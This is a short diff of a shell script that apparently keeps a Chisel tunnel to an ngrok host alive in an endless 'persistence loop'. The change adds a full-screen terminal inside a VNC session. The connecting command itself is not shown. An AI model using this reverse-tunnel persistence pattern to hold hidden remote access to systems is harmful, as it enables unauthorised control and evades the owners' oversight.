@@ -28,7 +28,15 @@ else
     echo "[+] Chisel binary found."
 fi
 
-# 2. Infinite Persistence Loop
+# 2. Setup Remote Environment (UI)
+# Launch a new terminal window so you have a shell inside the VNC session
+export DISPLAY=:1
+# Try to set a cursor (fixes invisible mouse in raw X)
+xsetroot -cursor_name left_ptr 2>/dev/null
+# Launch full-screen terminal (backgrounded so it doesn't block)
+x-terminal-emulator -geometry 170x60+0+0 &
+
+# 3. Infinite Persistence Loop
 echo "[*] Starting persistence loop connecting to $NGROK_HOST:$NGROK_PORT..."
 
 while true; do
